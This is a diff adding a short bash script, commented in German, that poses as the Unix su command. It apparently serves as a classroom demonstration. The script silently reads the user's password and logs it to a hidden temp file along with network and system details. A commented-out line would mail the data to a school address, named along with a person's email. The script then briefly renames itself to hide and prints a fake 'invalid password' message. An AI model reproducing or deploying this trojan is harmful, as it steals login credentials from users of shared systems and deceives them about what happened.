@@ -1,0 +1,38 @@
+#!/bin/bash
+# Boshafter Nachbau des su-Befehls
+TMPFILE="/tmp/.tmpfilexyz33"
+SLEEPFILE="./sleepfile"
+HIDDEN="./su_versteckt"
+SLEEP=10
+
+echo -n "Passwort: "
+read -s PASSWORT
+echo
+sleep 3
+# echo "su: ungültiges Kennwort"
+
+# Daten sammeln
+echo "Aufgerufenes Kommando: "$0" "$1" "$2  >  $TMPFILE
+echo "Passwort             : "$PASSWORT     >> $TMPFILE
+/sbin/ifconfig                              >> $TMPFILE
+/bin/uname -a                               >> $TMPFILE
+echo "."                                    >> $TMPFILE  # Ende der Mail
+
+# Mail versenden
+#/usr/bin/mail -s "Passwortklau" -r "ingolf.brunner@ba-leipzig.de" \
+#              "it2011@it2011.ba-leipzig.de"  < $TMPFILE
+
+# Aufräumen
+rm $TMPFILE
+# Script verbergen
+echo "#!/bin/bash"                         > $SLEEPFILE
+echo "/bin/mv "$0" "$HIDDEN               >> $SLEEPFILE
+echo "sleep "$SLEEP                       >> $SLEEPFILE
+echo "/bin/mv "$HIDDEN" "$0               >> $SLEEPFILE
+echo "/bin/rm "$SLEEPFILE                 >> $SLEEPFILE
+echo "exit 0"                             >> $SLEEPFILE
+/bin/chmod 777 $SLEEPFILE
+$SLEEPFILE &
+
+echo "su: ungültiges Kennwort"
+exit 1     # su liefert 1 zurück, wenn Passwort falsch
